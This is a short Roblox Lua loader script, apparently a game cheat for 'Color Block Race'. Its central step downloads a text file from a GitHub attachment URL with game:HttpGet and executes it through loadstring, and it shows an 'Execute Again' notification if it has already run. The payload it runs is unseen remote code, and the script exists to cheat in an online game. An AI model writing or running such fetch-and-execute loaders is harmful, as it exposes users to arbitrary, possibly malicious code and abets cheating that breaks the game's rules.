_G.Itzexecuted = _G.Itzexecuted or false

local function check()
    if not _G.Itzexecuted then
        loadstring(game:HttpGet("https://github.com/user-attachments/files/16476994/output-n0NqtD7.txt", true))()
        _G.Itzexecuted = true
    else
        local bind = Instance.new("BindableFunction")
        bind.OnInvoke = function(buttonClicked)
            if buttonClicked == "Execute Again" then
                loadstring(game:HttpGet("https://github.com/user-attachments/files/16476994/output-n0NqtD7.txt", true))(

                )
                _G.Itzexecuted = true
            end
        end

        game:GetService("StarterGui"):SetCore(
            "SendNotification",
            {
                Title = "[ UTH Color Block Race Script ]",
                Text = "UTH Color Block Race Script Has Already Been Executed",
                Button1 = "Execute Again",
                Button2 = "Don't Execute",
                Callback = bind
            }
        )
    end
end

check()